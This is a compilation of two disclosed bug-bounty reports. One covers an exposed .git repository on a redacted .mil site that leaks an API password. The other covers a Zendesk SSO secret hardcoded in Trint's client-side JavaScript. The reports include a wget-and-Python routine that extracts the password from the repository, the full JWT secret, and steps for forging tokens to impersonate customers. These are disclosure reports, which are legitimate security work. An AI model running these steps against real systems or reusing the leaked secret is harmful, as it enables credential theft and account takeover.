# Password in Configuration File

_2 reports — High/Critical, disclosed_

### [Git repo on https://██████.mil/ discloses API password](https://hackerone.com/reports/765825)

- **Report ID:** `765825`
- **Severity:** High
- **Weakness:** Password in Configuration File
- **Program:** U.S. Dept Of Defense
- **Reporter:** @al-madjus
- **Bounty:** - usd
- **Disclosed:** 2021-03-24T20:49:00.187Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
I found a .git repository on https://███████.mil/.git which discloses an API password for Yubikey on 2 different domains, together with full source code. 

**Description:**
Fetching the git repository and decompressing the objects results in the ability to read the source code of the server, which includes an API password for the Yubikey hardware authentication software. The API however does not appear to be functional on the main domain, but since the repository is very recent, I cannot be certain that it'll stay non-functional. 
Additionally, the server discloses info.php at https://███████.mil/info.php. I'm uncertain if this should be reported separately, any comments on this would be very welcome! 

## Impact
I'm rating the impact of this primarily as an information disclosure. The repository appears to have been active within the past months, so any future additions will be disclosed too. 
I was unable to use the found password as the API appears to be currently non-functional, but since the repo is active I would expect the server to be worked upon, and the API to be functional in the future. For this reason I've decided to make you aware of the issue. 
Also, even if the password were to be changed, it would of course still be disclosed on the repository. 
Furthermore, the repository discloses the full source code of the served pages. 

## Step-by-step Reproduction Instructions

1. Fetch the repo with wget:

`wget --no-parent -r https://█████.mil/.git/ --no-check-certificate`
2. Write the following python script (remember to update the 'pwd' variable): 

`import zlib
import os
pwd = INSERT FULL PATH WHERE THE REPO WAS DOWNLOADED + '█████████.mil/.git/objects/'
for subdir, dirs, files in os.walk(pwd):
    for file in files:
        if not file.startswith("index"):
            filename = subdir + '/' +  file
            compressed_contents = open(filename, 'rb').read()
            decompressed_contents = zlib.decompress(compressed_contents)
            print(str(decompressed_contents) + '\n')`

The script is also attached as a file. 
3. Run the script with 

`python gitreader.py | grep -i -E -o ".{0,138}restPW.{0,22}"`

Which greps the output for the string where the password is, together with the paths/domains. 
Of course, the full contents of the repository are available to look through. 

Example output: 
`'https://███`

## Product, Version, and Configuration (If applicable)

## Suggested Mitigation/Remediation Actions
Remove the .git repository from the server, since it contains sensitive information.

## Impact

I'm rating the impact of this primarily as an information disclosure. The repository appears to have been active within the past months, so any future additions will be disclosed too. 
I was unable to use the found password as the API appears to be currently non-functional, but since the repo is active I would expect the server to be worked upon, and the API to be functional in the future. For this reason I've decided to make you aware of the issue. 
Also, even if the password were to be changed, it would of course still be disclosed on the repository. 
Furthermore, the repository discloses the full source code of the served pages.

---

### [Insecure Zendesk SSO implementation by generating JWT client-side](https://hackerone.com/reports/638635)

- **Report ID:** `638635`
- **Severity:** High
- **Weakness:** Password in Configuration File
- **Program:** Trint Ltd
- **Reporter:** @xh3n1
- **Bounty:** - usd
- **Disclosed:** 2019-09-08T09:55:04.583Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
app.trint.com implements SSO to Zendesk, it does this by using JWT as described at https://support.zendesk.com/hc/en-us/articles/203663816-Enabling-JWT-JSON-Web-Token-single-sign-on

This functionality has not been implemented securely because the JWT generation happens in the client-side. This is done by the Zendesk secret being hardcoded in the JavaScript code.
The secret is used to create JSON Web Tokens and then you can use the generated token to impersonate any customer in Zendesk. (therefore potentially getting access to their support tickets)

Whilst support.trint.com is marked as out of scope for the program, the described vulnerability isn't caused by Zendesk. The vulnerable component is in app.trint.com.

## Assessment
The JavaScript source map files are available next to the minified production files. This significantly makes analyzing this issue easier.

- JavaScript file: https://app.trint.com/static/js/app.e984c9df.js
- Sourcemap file: https://app.trint.com/static/js/app.e984c9df.js.map

Looking at some of the UI views, I stumbled upon `static/js/modules/auth/pages/ZendeskLoadingPage.js`. I've attached a stripped version which shows the JWT generation:

```js
[snip]
import { ZENDESK_DOMAIN } from 'modules/core/constants/index';

const { REACT_APP_ZENDESK_SECRET } = process.env;

[snip]

function RedirectToZendesk(props) {
  const { user, history } = props;

  function generateZendeskTokenAndRedirect() {
    const TIME_NOW_OBJECT = moment(Date.now());
    try {
      const payload = {
        iat: TIME_NOW_OBJECT.unix(),
        jti: uuid.v4(),
        name: `${user.profile.firstName} ${user.profile.lastName}`,
        email: user.username,
      };

      // encode zendesk token
      const zendeskToken = jwt.sign(payload, REACT_APP_ZENDESK_SECRET);
      window.location = `${ZENDESK_DOMAIN}/access/jwt?jwt=${zendeskToken}`;
    } catch (err) {
      history.push('/error');
    }
  }

  useEffect(
    () => {
      generateZendeskTokenAndRedirect(user);
    },
    [user],
  );

  return <Loader />;
}

[snip]

export default ZendeskLoadingPage;
```

Searching for `REACT_APP_ZENDESK_SECRET` in the sourcemap will show the JWT secret: 

```js
var REACT_APP_ZENDESK_SECRET = "oq1HJ4jXo99Wt41bwvLh9BXBVdgpi52CjkXbThow7UhWQGtJ";
```

Generating the JWT on the client-side like this allows anyone to mint an arbitrary JWT. It would probably be better to generate this on the server-side.

## Reproduction steps

- As logged-in user press "Support" on https://app.trint.com
- Intercept the traffic and see the call to `https://trintsupport.zendesk.com/access/jwt?jwt=[JWT_TOKEN]`
- Logout of Zendesk
- Put the JWT token from above URI into https://jwt.io and decode it.

Example:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NjI3MDk2NTksImp0aSI6IjIxZDAyOTg3LWU3YWItNDQ5MC05N2Q3LTc2YTBmMzJhOTVjOCIsIm5hbWUiOiJUZXN0IFRlc3QiLCJlbWFpbCI6ImIzODcxNjk0QHVyaGVuLmNvbSJ9.mnnx7dbpXbvU7xr5Bp5pad2eHVN01mSsXApmZoFj73c
```

```
{
  "iat": 1562709659,
  "jti": "21d02987-e7ab-4490-97d7-76a0f32a95c8",
  "name": "Test Test",
  "email": "b3871694@urhen.com"
}
```

- Now we can continue with tampering the JWT 
  - Change IAT to the current Unix timestamp
  - Change JTI to a random UUID v4
  - Change email to the victim email address
  - Insert `oq1HJ4jXo99Wt41bwvLh9BXBVdgpi52CjkXbThow7UhWQGtJ` as HMAC secret.
- Use the resulting JWT in a call to `https://trintsupport.zendesk.com/access/jwt?jwt=[JWT_TOKEN]`. You will be logged in as the victim.

## Impact

Access to the Zendesk account of Trint customers. This includes potentially the support history of said user.

I haven't verified whether the same SSO flow can also be used against Zendesk administrators. If so, the risk would be higher.

---
